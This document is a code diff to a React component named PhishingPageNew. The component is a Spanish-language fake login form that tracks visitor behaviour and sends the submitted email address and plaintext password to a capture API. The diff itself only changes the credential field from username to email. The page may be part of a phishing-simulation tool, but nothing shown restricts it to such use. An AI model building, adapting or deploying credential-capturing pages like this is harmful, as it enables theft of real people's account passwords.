@@ -11,7 +11,7 @@ import { captureData } from '../utils/api';
 
 const PhishingPageNew = () => {
   // State
-  const [formData, setFormData] = useState({ username: '', password: '' });
+  const [formData, setFormData] = useState({ email: '', password: '' });
   const [isSubmitting, setIsSubmitting] = useState(false);
 
   // Behavior tracking
@@ -44,7 +44,7 @@ const PhishingPageNew = () => {
           behavior: { ...behaviorRef.current, timeOnPage },
           metadata: {
             userSubmitted: false,
-            formData: { username: null, password: null },
+            formData: { email: null, password: null },
             pageVisit: true
           },
           timestamp: new Date().toISOString(),
@@ -66,8 +66,8 @@ const PhishingPageNew = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    if (!formData.username || !formData.password) {
-      alert('Por favor ingresa tu usuario y contraseña');
+    if (!formData.email || !formData.password) {
+      alert('Por favor ingresa tu correo electrónico y contraseña');
       return;
     }
 
@@ -84,7 +84,7 @@ const PhishingPageNew = () => {
         metadata: {
           userSubmitted: true,
           formData: {
-            username: formData.username,
+            email: formData.email,
             password: formData.password
           }
         },
@@ -140,14 +140,14 @@ const PhishingPageNew = () => {
             <form onSubmit={handleSubmit} className="space-y-6">
               <div>
                 <label className="block text-sm font-medium text-gray-700 mb-2">
-                  Usuario o Correo Electrónico
+                  Correo Electrónico
                 </label>
                 <input
-                  type="text"
-                  value={formData.username}
-                  onChange={(e) => setFormData({ ...formData, username: e.target.value })}
+                  type="email"
+                  value={formData.email}
+                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                   className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition text-gray-900 bg-white"
-                  placeholder="tu.usuario@ejemplo.com"
+                  placeholder="tu.correo@ejemplo.com"
                   required
                 />
               </div>
